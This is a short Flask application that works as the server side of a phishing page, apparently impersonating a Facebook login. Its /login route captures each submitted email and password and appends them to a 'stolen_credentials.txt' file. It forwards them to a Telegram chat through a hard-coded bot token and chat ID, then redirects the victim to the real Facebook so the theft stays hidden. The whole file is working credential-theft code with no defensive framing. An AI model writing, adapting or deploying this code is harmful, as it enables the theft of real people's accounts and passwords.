from flask import Flask, render_template, request, redirect
import os
import requests
from datetime import datetime

app = Flask(__name__)

# ================== TELEGRAM ==================
TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
TELEGRAM_CHAT_ID = "6126534090"

def send_to_telegram(title, content):
    message = f"""
🔴 **{title}**

{content}
⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    """
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        print(f"✅ Đã gửi {title} về Telegram")
    except Exception as e:
        print(f"❌ Lỗi gửi Telegram: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    
    # Lưu file
    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
    
    # Gửi Telegram
    send_to_telegram("📧 TÀI KHOẢN + MẬT KHẨU", f"Email: {email}\nPassword: {password}")
    
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)